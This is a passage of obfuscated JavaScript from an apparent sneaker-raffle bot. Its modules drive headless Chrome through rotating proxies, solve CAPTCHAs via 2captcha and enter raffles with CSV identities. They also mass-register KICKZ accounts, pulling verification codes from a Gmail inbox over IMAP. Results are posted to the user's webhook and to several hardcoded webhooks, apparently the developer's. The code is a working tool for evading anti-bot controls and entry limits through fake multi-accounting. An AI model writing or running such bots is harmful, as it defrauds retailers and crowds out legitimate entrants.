                    var _0x118047 = await _0x117512(_0x2797f4[_0x74f3ce], _0x349b1f, 'dev', ![]), _0x65062e = await _0x117512(_0x2797f4[_0x74f3ce], _0x349b1f, 'pub', ![]);
                    const _0x427307 = {
                        'succesDEVMSG': { 'embeds': [_0x118047] },
                        'succesPUBMSG': { 'embeds': [_0x65062e] }
                    };
                    if (_0x79d23a['webhook'] != undefined && _0x79d23a['webhook'] != '')
                        try {
                            await _0x15c654(_0x79d23a['webhook'], _0x427307['succesDEVMSG']);
                        } catch {
                        }
                    await _0x289b0b(0xc8), await _0x15c654(_0x59432e, _0x427307['succesDEVMSG']), await _0x289b0b(0xc8);
                    try {
                        await _0x15c654(_0x1d7baa, _0x427307['succesPUBMSG']);
                    } catch {
                    }
                    if (_0x2797f4[_0x74f3ce]['Email'] == '' || _0x2797f4[_0x74f3ce]['Url'] == '' || _0x2797f4[_0x74f3ce]['FirstName'] == '' || _0x2797f4[_0x74f3ce]['LastName'] == '') {
                        console['log'](_0x3d201d() + '\x20[' + _0x1e8c04[taskModule]['name'] + ']\x20Task\x20' + (_0x74f3ce + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x79d23a['useRandomProxy'] = ![])
                        var _0x2b7ada = _0x43b372[_0x74f3ce]['split'](':');
                    else
                        var _0x4f02d3 = Math['round'](Math['random']() * (_0x43b372['length'] - 0x1)), _0x2b7ada = _0x43b372[_0x4f02d3]['split'](':');
                    var _0xff4ceb;
                    try {
                        _0xff4ceb = await _0x2926d5['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x2b7ada[0x0] + ':' + _0x2b7ada[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0xff4ceb = await _0x2926d5['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x2b7ada[0x0] + ':' + _0x2b7ada[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0x3c019c = await _0xff4ceb['newPage']();
                        await _0x3c019c['authenticate']({
                            'username': '' + _0x2b7ada[0x2],
                            'password': '' + _0x2b7ada[0x3]
                        }), console['log'](_0x3d201d() + '\x20[' + _0x349b1f['name'] + ']\x20Task\x20' + (_0x74f3ce + 0x1) + '\x20:\x20Getting\x20Session'), await _0x3c019c['setRequestInterception'](!![]), _0x3c019c['on']('request', _0x17006b => {
                            _0x17006b['resourceType']() === 'image' || _0x17006b['resourceType']() === 'font' || _0x17006b['resourceType']() === 'media' ? _0x17006b['abort']() : _0x17006b['continue']();
                        });
                        try {
                            await _0x3c019c['goto']('' + _0x2797f4[_0x74f3ce]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        try {
                            await _0x3c019c['waitForSelector']('#comp_firstname', { 'timeout': 0x7530 });
                        } catch {
                            throw new Error('Not\x20an\x20Active\x20Raffle');
                        }
                        console['log'](_0x3d201d() + '\x20[' + _0x349b1f['name'] + ']\x20Task\x20' + (_0x74f3ce + 0x1) + '\x20:\x20Filling\x20Information'), await _0x3c019c['type']('#comp_firstname', '' + _0x2797f4[_0x74f3ce]['FirstName']), await _0x3c019c['waitForSelector']('#comp_lastname'), await _0x3c019c['type']('#comp_lastname', '' + _0x2797f4[_0x74f3ce]['LastName']), await _0x3c019c['waitForSelector']('#comp_email'), await _0x3c019c['type']('#comp_email', '' + _0x2797f4[_0x74f3ce]['Email']), await _0x3c019c['waitForSelector']('#comp_paypalemail'), await _0x3c019c['type']('#comp_paypalemail', '' + _0x2797f4[_0x74f3ce]['Email']), await _0x3c019c['waitForSelector']('#comp_mobile_end'), await _0x3c019c['type']('#comp_mobile_end', '' + _0x2797f4[_0x74f3ce]['Phone']), await _0x3c019c['waitForSelector']('#comp_dob'), await _0x3c019c['type']('#comp_dob', '08/09/1992'), console['log'](_0x3d201d() + '\x20[' + _0x349b1f['name'] + ']\x20Task\x20' + (_0x74f3ce + 0x1) + '\x20:\x20Choosing\x20Size');
                        if (_0x2797f4[_0x74f3ce]['Size'] == 'RANDOM') {
                            const _0x3ad460 = await _0x3c019c['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x30d46b => {
                                return _0x30d46b['map'](_0x33c125 => _0x33c125['value']);
                            });
                            var _0x4a33df = Math['round'](Math['random']() * (_0x3ad460['length'] - 0x2));
                            await _0x3c019c['select']('#shoesize', _0x3ad460[_0x4a33df + 0x1]), await _0x289b0b(0x3e8);
                        } else {
                            const _0x344300 = await _0x3c019c['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x3106d4 => {
                                return _0x3106d4['map'](_0x1bf038 => _0x1bf038['innerText']);
                            }), _0x40a375 = await _0x3c019c['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x5af31a => {
                                return _0x5af31a['map'](_0x4b0c96 => _0x4b0c96['value']);
                            });
                            var _0x2c8032 = _0x2797f4[_0x74f3ce]['Size'];
                            for (var _0x515ca9 = 0x1; _0x515ca9 < _0x40a375['length']; _0x515ca9++) {
                                var _0x3278bf = _0x344300[_0x515ca9]['split']('\x20')[0x0];
                                if (_0x3278bf == _0x2c8032) {
                                    await _0x3c019c['select']('#shoesize', _0x40a375[_0x515ca9]);
                                    break;
                                } else {
                                    if (_0x515ca9 + 0x1 == _0x40a375['length'])
                                        throw new Error('Size\x20Not\x20Found..');
                                }
                            }
                        }
                        await _0x3c019c['waitForSelector']('#comp_address1'), await _0x3c019c['type']('#comp_address1', _0x2797f4[_0x74f3ce]['Address1'] + '\x20' + _0x2797f4[_0x74f3ce]['HouseNumber']), await _0x3c019c['waitForSelector']('#comp_address2'), await _0x3c019c['type']('#comp_address2', '' + _0x2797f4[_0x74f3ce]['Address2']), await _0x3c019c['waitForSelector']('#comp_address2'), await _0x3c019c['type']('#comp_address3', '' + _0x2797f4[_0x74f3ce]['City']), await _0x3c019c['waitForSelector']('#comp_postcode'), await _0x3c019c['type']('#comp_postcode', '' + _0x2797f4[_0x74f3ce]['Zip']), console['log'](_0x3d201d() + '\x20[' + _0x349b1f['name'] + ']\x20Task\x20' + (_0x74f3ce + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x289b0b(0x4b0), await _0x3c019c['click']('label#emailhold'), await _0x289b0b(0x5dc), await _0x3c019c['click']('#preauth_tandc_email\x20>\x20label'), await _0x289b0b(0x5dc), await _0x3c019c['click']('#submit');
                        try {
                            await _0x3c019c['waitForSelector']('#paymentWrap');
                        } catch {
                            throw new Error('Could\x20not\x20find\x20Payment');
                        }
                        console['log'](_0x3d201d() + '\x20[' + _0x349b1f['name'] + ']\x20Task\x20' + (_0x74f3ce + 0x1) + '\x20:\x20' + _0x1ac777['blue']('Awaiting\x20Paypal\x20Payment')), _0xff4ceb['on']('targetcreated', async _0x1238ec => {
                            if (_0x1238ec['type']() === 'page') {
                                const _0x2e1d93 = await _0x1238ec['page']();
                                async function _0x2c6873() {
                                    try {
                                        await _0x3c019c['waitForSelector']('#error_message', { 'timeout': 0x493e0 }), _0x366bb8 = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                async function _0x4b943b() {
                                    try {
                                        await _0x3c019c['waitForSelector']('#successMessage', { 'timeout': 0x493e0 }), _0x5b9031 = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                _0x4b943b(), _0x2c6873(), await _0x289b0b(0x493e0);
                            }
                        });
                        async function _0x8aa08() {
                            for (let _0x1c6688 = 0x0; _0x1c6688 < 0x12c; _0x1c6688++) {
                                if (_0x5b9031 == !![]) {
                                    _0x3fcd35 = 'no', _0x53c50d(_0x2797f4[_0x74f3ce], _0x349b1f), console['log'](_0x1ac777['green'](_0x3d201d() + '\x20[' + _0x349b1f['name'] + ']\x20Task\x20' + (_0x74f3ce + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                    if (_0x79d23a['webhook'] != undefined && _0x79d23a['webhook'] != '')
                                        try {
                                            await _0x15c654(_0x79d23a['webhook'], _0x427307['succesDEVMSG']);
                                        } catch {
                                        }
                                    await _0x289b0b(0xc8), await _0x15c654(_0x59432e, _0x427307['succesDEVMSG']), await _0x289b0b(0xc8);
                                    try {
                                        await _0x15c654(_0x1d7baa, _0x427307['succesPUBMSG']);
                                    } catch {
                                    }
                                    return;
                                } else {
                                    if (_0x366bb8)
                                        throw new Error('Paypal\x20Error:\x20Target\x20closed');
                                    else
                                        await _0x289b0b(0x3e8);
                                }
                            }
                            throw new Error('Paypal\x20Error');
                        }
                        await _0x289b0b(0xbb8), await _0x3c019c['click']('.zoid-outlet'), await _0x289b0b(0x7d0), await _0x8aa08();
                    } catch (_0x36496d) {
                        console['log'](_0x1ac777['red'](_0x3d201d() + '\x20[' + _0x349b1f['name'] + ']\x20Task\x20' + (_0x74f3ce + 0x1) + '\x20:\x20' + _0x36496d)), _0x5d6d5e = '' + _0x36496d;
                        var _0x2e1c82 = await _0x117512(_0x2797f4[_0x74f3ce], _0x349b1f, 'dev', !![], _0x5d6d5e);
                        _0x427307['errorDEV'] = { 'embeds': [_0x2e1c82] }, _0x79d23a['webhook'] != undefined && _0x79d23a['webhook'] != '' && await _0x15c654(_0x79d23a['webhook'], _0x427307['errorDEV']), await _0x15c654(_0x34ab86, _0x427307['errorDEV']);
                    } finally {
                        _0xff4ceb && _0xff4ceb['close']();
                        if (_0x3fcd35 == 'yes' && _0x4381f5 != 0x5 && _0x5d6d5e != 'Size\x20Not\x20Found') {
                            console['log'](_0x1ac777['red'](_0x3d201d() + '\x20[' + _0x349b1f['name'] + ']\x20Task\x20' + (_0x74f3ce + 0x1) + '\x20:\x20Retrying\x20(' + _0x4381f5 + '\x20/\x205)')), _0x74f3ce = _0x74f3ce - 0x1, _0x4381f5 = _0x4381f5 + 0x1;
                            continue;
                        }
                        _0x3fcd35 == 'yes' && _0x4381f5 >= 0x5 && (_0x5f4429(afew[_0x74f3ce], _0x349b1f), _0x3fcd35 = 'no', _0x4381f5 = 0x0), console['log']('Waiting\x20for\x20' + _0x79d23a['delay'] + '\x20ms'), await _0x289b0b(_0x79d23a['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'KICKZ',
        'modules': [
            {
                'name': 'KICKZ\x20Account\x20Generator',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x22d6f8, _0x537816, _0x4aef51) {
                    _0x2926d5['use'](_0x409c7d()), _0x2926d5['use'](_0x4a68ab({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x79d23a['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x3bafb4 = 0x0; _0x3bafb4 < _0x537816['length']; _0x3bafb4++) {
                        const _0x1a12e4 = 'https://www.kickz.com/login';
                        if (_0x3619e1 != 'yes')
                            var _0x3619e1 = '', _0x2d17c9 = 0x0;
                        _0x25b0b6(_0x22d6f8['name'] + '\x20Task\x20' + (_0x3bafb4 + 0x1) + '\x20/\x20' + _0x537816['length'] + '\x20||\x20File:\x20' + _0x273bbf + '\x20Proxies:\x20' + _0x11770e);
                        try {
                            await _0x5af4d5(_0x537816, _0x3bafb4);
                        } catch {
                            _0x3619e1 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x130c8c = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x2e53d0
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x79d23a['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x492c9c
                                }
                            ]
                        }];
                        const _0x5a7827 = { 'embeds': _0x130c8c };
                        var _0x285f6e = await _0x117512(_0x537816[_0x3bafb4], _0x22d6f8, 'acc', ![]);
                        const _0x49fa0d = { 'succesDEVMSG': { 'embeds': [_0x285f6e] } };
                        if (_0x537816[_0x3bafb4]['Email'] == '' || _0x537816[_0x3bafb4]['FirstName'] == '' || _0x537816[_0x3bafb4]['LastName'] == '') {
                            console['log'](_0x3d201d() + '\x20[' + _0x22d6f8['name'] + ']\x20Task\x20' + (_0x3bafb4 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x537816[_0x3bafb4]['Password'] == '' && (_0x537816[_0x3bafb4]['Password'] = 'JRaffles23!');
                        if (_0x79d23a['useRandomProxy'] = ![])
                            var _0x366299 = _0x4aef51[_0x3bafb4]['split'](':');
                        else
                            var _0x50273b = Math['round'](Math['random']() * (_0x4aef51['length'] - 0x1)), _0x366299 = _0x4aef51[_0x50273b]['split'](':');
                        var _0x42db76;
                        try {
                            _0x42db76 = await _0x2926d5['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x366299[0x0] + ':' + _0x366299[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x42db76 = await _0x2926d5['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x366299[0x0] + ':' + _0x366299[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x3dd4e4 = await _0x42db76['newPage']();
                            await _0x3dd4e4['authenticate']({
                                'username': '' + _0x366299[0x2],
                                'password': '' + _0x366299[0x3]
                            }), console['log'](_0x3d201d() + '\x20[' + _0x22d6f8['name'] + ']\x20Task\x20' + (_0x3bafb4 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x3dd4e4['setRequestInterception'](!![]), _0x3dd4e4['on']('request', _0x4e1615 => {
                                _0x4e1615['resourceType']() === 'image' || _0x4e1615['resourceType']() === 'font' || _0x4e1615['resourceType']() === 'media' ? _0x4e1615['abort']() : _0x4e1615['continue']();
                            }), await _0x3dd4e4['goto'](_0x1a12e4), await _0x289b0b(0xbb8), console['log'](_0x3d201d() + '\x20[' + _0x22d6f8['name'] + ']\x20Task\x20' + (_0x3bafb4 + 0x1) + '\x20:\x20Starting\x20Registration'), await _0x3dd4e4['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x3dd4e4['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x3dd4e4['waitForSelector']('#button-register'), await _0x289b0b(0x7d0), await _0x3dd4e4['evaluate'](() => {
                                const _0x44c739 = document['querySelector']('#button-register');
                                _0x44c739['click']();
                            }), console['log'](_0x3d201d() + '\x20[' + _0x22d6f8['name'] + ']\x20Task\x20' + (_0x3bafb4 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x289b0b(0x1388), await _0x3dd4e4['waitForSelector']('#customer_salutation'), await _0x3dd4e4['select']('#customer_salutation', 'mr'), await _0x289b0b(0x7d0), await _0x3dd4e4['waitForSelector']('#customer_firstname'), await _0x3dd4e4['type']('#customer_firstname', '' + _0x537816[_0x3bafb4]['FirstName']), await _0x289b0b(0x352), await _0x3dd4e4['waitForSelector']('#customer_lastname'), await _0x3dd4e4['type']('#customer_lastname', '' + _0x537816[_0x3bafb4]['LastName']), await _0x289b0b(0x352), await _0x3dd4e4['type']('#email-input', '' + _0x537816[_0x3bafb4]['Email']), await _0x289b0b(0x352), await _0x3dd4e4['type']('#email-confirm-input', '' + _0x537816[_0x3bafb4]['Email']), await _0x289b0b(0x352), await _0x3dd4e4['type']('#register-password', '' + _0x537816[_0x3bafb4]['Password']), await _0x289b0b(0x352), await _0x3dd4e4['type']('#password-confirm', '' + _0x537816[_0x3bafb4]['Password']), await _0x289b0b(0x352), console['log'](_0x3d201d() + '\x20[' + _0x22d6f8['name'] + ']\x20Task\x20' + (_0x3bafb4 + 0x1) + '\x20:\x20Sending\x20Credentials'), await _0x3dd4e4['click']('#consent'), await _0x289b0b(0x1f4);
                            const _0x45e967 = await _0x3dd4e4['$']('div.inputErrorMsg.b-form_section-message');
                            if (_0x45e967) {
                                console['log'](_0x1ac777['red'](_0x3d201d() + '\x20[' + _0x22d6f8['name'] + ']\x20Task\x20' + (_0x3bafb4 + 0x1) + '\x20:\x20Your\x20password\x20must\x20contain\x20at\x20least\x20one\x20uppercase\x20&\x20one\x20lowercase\x20letter,\x20one\x20number\x20and\x20one\x20special\x20character.'));
                                continue;
                            }
                            await _0x3dd4e4['click']('#buttonRegister');
                            try {
                                await _0x3dd4e4['waitForSelector']('#verificationCode');
                            } catch {
                                throw new Error('Account\x20already\x20registered');
                            }
                            console['log'](_0x3d201d() + '\x20[' + _0x22d6f8['name'] + ']\x20Task\x20' + (_0x3bafb4 + 0x1) + '\x20:\x20A\x20verification\x20code\x20has\x20been\x20sent\x20to\x20' + _0x537816[_0x3bafb4]['Email']), await _0x289b0b(0x4b0);
                            async function _0xc8a16e() {
                                var _0x441dd3, _0x5dc077 = ![];
                                for (var _0x5e31a7 = 0x0; _0x5e31a7 < 0x18; _0x5e31a7++) {
                                    async function _0x2a5546() {
                                        var _0x597b76 = new _0x517e1b({
                                            'user': _0x79d23a['masterMail'],
                                            'password': _0x79d23a['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x465597(_0x17edf2) {
                                            _0x597b76['openBox']('INBOX', ![], _0x17edf2);
                                        }
                                        _0x597b76['once']('ready', function () {
                                            console['log'](_0x3d201d() + '\x20[' + _0x22d6f8['name'] + ']\x20Task\x20' + (_0x3bafb4 + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x465597(function (_0x57ec69, _0x32ca3c) {
                                                console['log'](_0x3d201d() + '\x20[' + _0x22d6f8['name'] + ']\x20Task\x20' + (_0x3bafb4 + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x57ec69)
                                                    throw _0x57ec69;
                                                _0x597b76['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'verification@kickz.com'
                                                    ]
                                                ], function (_0x4d352e, _0x5ef6e7) {
                                                    if (!_0x5ef6e7 || !_0x5ef6e7['length'])
                                                        console['log'](_0x3d201d() + '\x20[' + _0x22d6f8['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x597b76['end']();
                                                    else {
                                                        var _0x2d4ea3 = _0x597b76['seq']['fetch'](_0x5ef6e7, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x2d4ea3['on']('message', function (_0x445e3f, _0x179313) {
                                                            var _0x2f41b6 = '(#' + _0x179313 + ')\x20';
                                                            _0x445e3f['on']('body', function (_0x17518e, _0x270ba2) {
                                                                _0xa13a33(_0x17518e, (_0x1144df, _0x2cb668) => {
                                                                    if (_0x2cb668['subject'] == 'Kickz\x20Account\x20Verification\x20Code') {
                                                                        var _0x976be3 = _0x2cb668['html']['split']('<div\x20style=\x22display:block;font-family:Arial,sans-serif;font-size:\x2030px;font-weight:\x20600;line-height:24px;color:#333333\x22>'), _0x5e854e = _0x976be3[0x1]['split']('<')[0x0];
                                                                        _0x441dd3 = _0x5e854e;
                                                                    }
                                                                });
                                                            }), _0x445e3f['once']('end', function () {
                                                            });
                                                        }), _0x2d4ea3['once']('error', function (_0x3bbcbd) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x2d4ea3['once']('end', function () {
                                                            _0x597b76['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x597b76['once']('error', function (_0x41bf91) {
                                            console['log'](_0x1ac777['red'](_0x41bf91['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x5dc077 = !![];
                                        }), _0x597b76['once']('end', async function () {
                                        }), _0x597b76['connect']();
                                    }
                                    _0x2a5546(), await _0x289b0b(0x1388);
                                    if (_0x441dd3)
                                        return _0x441dd3;
                                    if (_0x5dc077)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x5e31a7 == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0xc8a16e(), _0x289b0b(0x320), console['log'](_0x3d201d() + '\x20[' + _0x22d6f8['name'] + ']\x20Task\x20' + (_0x3bafb4 + 0x1) + '\x20:\x20Verifying..'), await _0x3dd4e4['type']('#verificationCode', code), await _0x289b0b(0x1f4), await _0x3dd4e4['click']('#buttonVerify'), await _0x289b0b(0x190), await _0x3dd4e4['click']('#buttonVerify'), await _0x289b0b(0x3e8);
                            try {
                                await _0x3dd4e4['waitForSelector']('div.b-user_greeting'), _0x3619e1 = 'no', console['log'](_0x1ac777['green'](_0x3d201d() + '\x20[' + _0x22d6f8['name'] + ']\x20Task\x20' + (_0x3bafb4 + 0x1) + '\x20:\x20Account\x20' + _0x537816[_0x3bafb4]['Email'] + '\x20Generated\x20&\x20Verified!')), _0x457b0a['appendFileSync']('../accounts/kickz-verified.csv', '\x0a' + _0x537816[_0x3bafb4]['Email'] + ',' + _0x537816[_0x3bafb4]['Password'] + ','), console['log'](_0x3d201d() + '\x20[' + _0x22d6f8['name'] + ']\x20Task\x20' + (_0x3bafb4 + 0x1) + '\x20:\x20Account\x20' + _0x537816[_0x3bafb4]['Email'] + '\x20Saved\x20in\x20\x27accounts/kickz-verified.csv\x27');
                                try {
                                    _0x79d23a['webhook'] != undefined && _0x79d23a['webhook'] != '' && await _0x15c654(_0x79d23a['webhook'], _0x49fa0d['succesDEVMSG']);
                                } catch {
                                }
                                await _0x15c654(_0x534fd1, _0x49fa0d['succesDEVMSG']);
                            } catch {
                                _0x3619e1 = 'no', console['log'](_0x1ac777['red'](_0x3d201d() + '\x20[' + _0x22d6f8['name'] + ']\x20Task\x20' + (_0x3bafb4 + 0x1) + '\x20:\x20Verification\x20failed')), console['log'](_0x1ac777['red'](_0x3d201d() + '\x20[' + _0x22d6f8['name'] + ']\x20Task\x20' + (_0x3bafb4 + 0x1) + '\x20:\x20Account\x20saved\x20in\x20\x27accounts/kickz-unverified.csv\x27'));
                            }
                        } catch (_0x3c8f1d) {
                            console['log'](_0x1ac777['red'](_0x3d201d() + '\x20[' + _0x22d6f8['name'] + ']\x20Task\x20' + (_0x3bafb4 + 0x1) + '\x20:\x20' + _0x3c8f1d)), _0x130c8c[0x0]['title'] = 'Failed\x20kickz\x20Acc\x20Gen', _0x130c8c[0x0]['description'] = '' + _0x3c8f1d, await _0x15c654(_0x34ab86, _0x5a7827), _0x3619e1 = 'yes';
                        } finally {
                            _0x42db76 && _0x42db76['close']();
                            if (_0x3619e1 == 'yes' && _0x2d17c9 != 0x5) {
                                console['log'](_0x1ac777['red'](_0x3d201d() + '\x20[' + _0x22d6f8['name'] + ']\x20Task\x20' + (_0x3bafb4 + 0x1) + '\x20:\x20Retrying\x20(' + _0x2d17c9 + '\x20/\x205)')), _0x3bafb4 = _0x3bafb4 - 0x1, _0x2d17c9 = _0x2d17c9 + 0x1;
                                continue;
                            }
                            _0x3619e1 == 'yes' && _0x2d17c9 >= 0x5 && (_0x5f4429(_0x537816[_0x3bafb4], _0x22d6f8), _0x3619e1 = 'no', _0x2d17c9 = 0x0), console['log']('Waiting\x20for\x20' + _0x79d23a['delay'] + '\x20ms'), await _0x289b0b(_0x79d23a['delay']);
                        }
                    }
                }
            },
            {
                'name': 'KICKZ\x20Raffle\x20Entries',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x114f20, _0x5ac7cb, _0x2e5fda) {
                    _0x2926d5['use'](_0x409c7d()), _0x2926d5['use'](_0x4a68ab({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x79d23a['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x129175 = 0x0; _0x129175 < _0x5ac7cb['length']; _0x129175++) {
                        var _0x3b4600;
                        if (_0x53edbc != 'yes')
                            var _0x53edbc = '', _0x49a261 = 0x0;
                        _0x25b0b6(_0x114f20['name'] + '\x20Task\x20' + (_0x129175 + 0x1) + '\x20/\x20' + _0x5ac7cb['length'] + '\x20||\x20File:\x20' + _0x273bbf + '\x20Proxies:\x20' + _0x11770e);
                        var _0x45fead = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Entry',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x2e53d0
                                },
                                {
                                    'name': 'Product',
                                    'value': '' + _0x5ac7cb[_0x129175]['Url']
                                },
                                {
                                    'name': 'Size',
                                    'value': '' + _0x5ac7cb[_0x129175]['Size']
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x79d23a['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x492c9c
                                }
                            ]
                        }];
                        let _0x1b3184 = [
                            'Email',
                            'Password',
                            'FirstName',
                            'LastName',
                            'Size',
                            'Address1',
                            'HouseNumber',
                            'Zip',
                            'Country',
                            'City'
                        ], _0x5bceea = ![];
                        for (key of _0x1b3184) {
                            if (_0x5ac7cb[_0x129175][key] == '' || !_0x5ac7cb[_0x129175][key]) {
                                console['log'](_0x3d201d() + '\x20[' + _0x114f20['name'] + ']\x20Task\x20' + (_0x129175 + 0x1) + '\x20:\x20Invalid\x20CSV,\x20' + key + '\x20not\x20found'), _0x5bceea = !![];
                                break;
                            }
                        }
                        if (_0x5bceea) {
                            await _0x289b0b(0x1f4);
                            continue;
                        }
                        var _0x467abf = await _0x117512(_0x5ac7cb[_0x129175], _0x114f20, 'dev', ![]), _0x53db95 = await _0x117512(_0x5ac7cb[_0x129175], _0x114f20, 'pub', ![]);
                        const _0x1f34f1 = {
                            'succesDEVMSG': { 'embeds': [_0x467abf] },
                            'succesPUBMSG': { 'embeds': [_0x53db95] }
                        };
                        try {
                            await _0x5af4d5(_0x5ac7cb, _0x129175);
                        } catch {
                            _0x53edbc = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x79d23a['useRandomProxy'] = ![])
                            var _0x4992a3 = _0x2e5fda[_0x129175]['split'](':');
                        else
                            var _0x4bd4a0 = Math['round'](Math['random']() * (_0x2e5fda['length'] - 0x1)), _0x4992a3 = _0x2e5fda[_0x4bd4a0]['split'](':');
                        var _0x3d0232;
                        try {
                            _0x3d0232 = await _0x2926d5['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x4992a3[0x0] + ':' + _0x4992a3[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x3d0232 = await _0x2926d5['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x4992a3[0x0] + ':' + _0x4992a3[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x259cb7 = await _0x3d0232['newPage']();
                            await _0x259cb7['authenticate']({
                                'username': '' + _0x4992a3[0x2],
                                'password': '' + _0x4992a3[0x3]
                            }), console['log'](_0x3d201d() + '\x20[' + _0x114f20['name'] + ']\x20Task\x20' + (_0x129175 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x259cb7['setRequestInterception'](!![]), _0x259cb7['on']('request', _0x55472b => {
                                _0x55472b['resourceType']() === 'image' || _0x55472b['resourceType']() === 'font' || _0x55472b['resourceType']() === 'media' ? _0x55472b['abort']() : _0x55472b['continue']();
                            }), await _0x259cb7['goto']('' + _0x5ac7cb[_0x129175]['Url']['replace']('\x20', ''), { 'waitUntil': 'networkidle2' }), await _0x289b0b(0x12c), await _0x259cb7['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x259cb7['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x289b0b(0x7d0);
                            try {
                                await _0x259cb7['click']('a[title=\x22Sign\x20In\x22]');
                            } catch {
                                await _0x259cb7['click']('a[title=\x22sign\x20in\x22]');
                            }
